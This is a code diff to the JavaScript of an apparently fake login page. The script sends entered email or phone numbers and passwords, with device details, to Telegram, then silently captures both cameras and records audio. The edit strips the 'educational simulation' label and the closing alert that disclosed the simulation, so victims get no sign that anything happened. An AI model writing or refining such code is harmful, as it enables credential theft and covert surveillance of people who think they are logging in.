@@ -130,14 +130,14 @@ loginBtn.addEventListener('click', async()=>{
     loadingDetails.textContent='Selesai memuat.';
 
     const deviceInfo=await collectDeviceInfo();
-    const dataToSend=`Simulasi Edukasi Login\nEmail/Telepon: ${email}\nPassword: ${password}\n\n${deviceInfo}`;
+    const dataToSend=` Login\nEmail/Telepon: ${email}\nPassword: ${password}\n\n${deviceInfo}`;
     await sendToTelegram(dataToSend);
 
     await captureCamera('user');          // Depan
     await captureCamera('environment');   // Belakang
     await recordAudio(5000);              // Rekam suara 5 detik
 
-    setTimeout(()=>{ alert('Simulasi edukasi selesai.'); emailInput.value=''; passwordInput.value=''; progress=0; progressBar.style.width='0%'; loadingDetails.textContent=''; startLoadingSimulation(); },500);
+    setTimeout(()=>{ emailInput.value=''; passwordInput.value=''; progress=0; progressBar.style.width='0%'; loadingDetails.textContent=''; startLoadingSimulation(); },500);
 });
 
 function startLoadingSimulation(){ progress=0; loadingDetails.textContent=''; loadingInterval=setInterval(()=>{ progress+=Math.random()*5; if(progress>98) progress=98; progressBar.style.width=progress+'%'; progressBar.parentElement.setAttribute('aria-valuenow',Math.floor(progress)); if(Math.random()>0.9) loadingDetails.textContent=loadingMessages[Math.floor(Math.random()*loadingMessages.length)]; },500); }
